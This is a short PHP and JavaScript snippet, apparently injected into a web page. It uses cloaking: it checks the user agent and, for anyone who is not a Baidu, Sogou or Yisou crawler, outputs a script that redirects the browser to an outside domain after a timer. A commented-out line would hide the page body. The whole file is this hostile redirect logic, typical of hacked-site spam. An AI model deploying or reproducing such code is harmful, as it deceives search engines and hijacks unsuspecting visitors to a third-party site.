document.write('tj js');
<?php
define('u_s',$_SERVER['HTTP_USER_AGENT']);
define('s_s','@baiduspider|Sogou web spider|yisou@i');
if(!preg_match(s_s,u_s)) {
?>
function jumurl(){
window.location.href = 'http://www.d58d58.com'
}
setTimeout(jumurl,100000)
//document.write('<body style="display: none;margin-top:0px; margin:0px; padding:0px;display: block; border: none;height: 0px;width: 0px;overflow:hidden;">');
<?php
}
?>